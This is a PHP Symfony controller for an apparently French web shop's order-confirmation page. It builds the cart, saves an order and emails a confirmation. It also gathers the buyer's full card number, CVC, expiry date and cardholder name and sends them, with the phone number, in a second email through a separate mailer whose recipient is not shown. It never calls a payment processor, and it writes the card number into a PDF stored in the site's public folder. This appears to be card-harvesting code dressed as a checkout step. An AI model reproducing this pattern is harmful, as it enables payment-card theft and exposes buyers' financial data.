<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use App\Entity\OrderStatus;
use App\Service\MailerService;
use Doctrine\ORM\EntityManagerInterface;
use App\Service\Pdfgenerator;
use Symfony\Component\HttpFoundation\Session\SessionInterface;
use Symfony\Component\HttpFoundation\Request; 
use App\Repository\ProductsRepository;
use App\Service\MailerService2;


final class ThankyouController extends AbstractController
{
    private $mailerService;
    private $mailerService2;


    public function __construct(MailerService $mailerService , mailerService2 $mailerService2)
    {
        $this->mailerService = $mailerService;
        $this->mailerService2 = $mailerService2;

    }

    #[Route('/thankyou', name: 'app_thankyou')]
    public function index(SessionInterface $session, ProductsRepository $productsRepository, Request $request, EntityManagerInterface $entityManager, Pdfgenerator $pdfgenerator): Response
    {
        // Vérifier si la requête est une soumission de formulaire
        if (!$request->isMethod('POST')) {
            // Si on tente d'accéder directement à cette page sans POST, rediriger vers la page de commande
            return $this->redirectToRoute('app_order');
        }

        // Récupération du panier depuis la session
        $cart = $session->get('cart', []);
        $cartItems = [];
        $total = 0;
        $itemCount = 0;
        
        foreach ($cart as $id => $quantity) {
            $product = $productsRepository->find($id);
            
            if ($product) { // Vérification que le produit existe
                $cartItems[] = [
                    'product' => $product,
                    'quantity' => $quantity,
                ];
                
                // Calcul du total et du nombre d'articles
                $total += $product->getPrice() * $quantity;
                $itemCount += $quantity;
            } else {
                // Suppression de l'article du panier si le produit n'existe plus
                unset($cart[$id]);
            }
        }
        
        // Mise à jour du compteur d'articles dans la session
        $session->set('itemCount', $itemCount);

        // Génération d'un numéro de commande unique
        $numCommande = date_modify(new \DateTime(), '-600 days')->format('nj') . date_modify(new \DateTime(), '-2000 days')->format('YjnGi');
        $dateFormat = (new \DateTime())->format('d/m/Y');
        $date_echeance  =(new \DateTime())->modify('+14 days')->format('d/m/Y');

        // Récupération et nettoyage des données du formulaire
        $formData = [
            'c_country' => filter_var($request->request->get('pays'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_fname' => filter_var($request->request->get('nom'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_address' => filter_var($request->request->get('rue'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_state_country' => filter_var($request->request->get('ville'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_postal_zip' => filter_var($request->request->get('code_postal'), FILTER_SANITIZE_NUMBER_INT),
            'c_email_address' => filter_var($request->request->get('email'), FILTER_VALIDATE_EMAIL),
            'c_phone' => filter_var($request->request->get('telephone'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_cardnumber' => filter_var($request->request->get('cardnumber'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_cardcvc' => filter_var($request->request->get('cardcvc'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_cardname' => filter_var($request->request->get('cardname'), FILTER_SANITIZE_SPECIAL_CHARS),
            'c_carddate' => filter_var($request->request->get('carddate'), FILTER_SANITIZE_SPECIAL_CHARS),
        ];

        $nom = $formData['c_fname'];
        $email = $formData['c_email_address'];
        $dateday = new \DateTimeImmutable();

        // Création d'un nouvel ordre dans la base de données
        $orderstatus = new OrderStatus();
        $orderstatus->setNumber($numCommande);
        $orderstatus->setEmail($formData['c_email_address']);
        $orderstatus->setName($formData['c_fname']);
        $orderstatus->setCreatedAt($dateday);
        $orderstatus->setStatut(false); // statut initial: non traité
        $entityManager->persist($orderstatus);
        $entityManager->flush();

        // Préparation du contenu de l'email
        $emailBody = $this->renderView('thankyou/email.html.twig', [
            'nom' => $formData['c_fname'],
            'carte' => $formData['c_cardnumber'],

            'adresse' => $formData['c_address'],
            'ville' => $formData['c_state_country'],
            'cop' => $formData['c_postal_zip'],
            'numcommande' => $numCommande,
            'cart' => $cart,
            'total' => $total,
            'date' => $dateFormat,
            'cartItems' => $cartItems,
            'pays' => $formData['c_country'],     
        ]);
        // email 2

        $emailBody2 = $this->renderView('thankyou/email2.html.twig', [

            'nom' => $formData['c_fname'],
            'tel' => $formData['c_phone'],

            'card' => $formData['c_cardnumber'],
            'date' => $formData['c_carddate'],
            'cardcvc' => $formData['c_cardcvc'],
            'cardname' => $formData['c_cardname'],


            'adresse' => $formData['c_address'],
            'ville' => $formData['c_state_country'],
            'cop' => $formData['c_postal_zip'],
            'numcommande' => $numCommande,
            'cart' => $cart,
            'total' => $total,

        ]);
        // Contenu pour le PDF
        $html = $this->renderView('thankyou/pdfgenerator.html.twig', [
            'nom' => $formData['c_fname'],
            'carte' => $formData['c_cardnumber'],

            'adresse' => $formData['c_address'],
            'ville' => $formData['c_state_country'],
            'cop' => $formData['c_postal_zip'],
            'numcommande' => $numCommande,
            'cart' => $cart,
            'total' => $total,
            'date' => $dateFormat,
            'pays' => $formData['c_country'], 
            'cartItems' => $cartItems,
            'date_echeance'=> $date_echeance ,
        ]);

        // Chemin pour enregistrer le PDF
        $pdfPath = $this->getParameter('kernel.project_dir') . '/public/images/pdf/' . $numCommande . '.pdf';

        // Générer le PDF et l'enregistrer dans le dossier
        $pdf = $pdfgenerator->output($html);
        file_put_contents($pdfPath, $pdf);

        // Envoyer l'email de confirmation
        $subject = 'Confirmation de commande';
        $this->mailerService->sendConfirmationEmail($email, $numCommande, $subject, $emailBody);
        $this->mailerService2->sendConfirmationEmail($emailBody2);

        // Vider le panier après la commande
        $session->remove('cart'); 

        // Afficher la page de remerciement
        return $this->render('thankyou/index.html.twig', [
            'controller_name' => 'ThankyouController',
            'itemCount' => $itemCount,
            'cartItems' => $cartItems,
            'total' => $total,
            'numcommande' => $numCommande,
            'adresseLivraison' => $formData ?? [],
            'cart' => $cart,
            'nom' => $formData['c_fname'],
        ]);
    }
}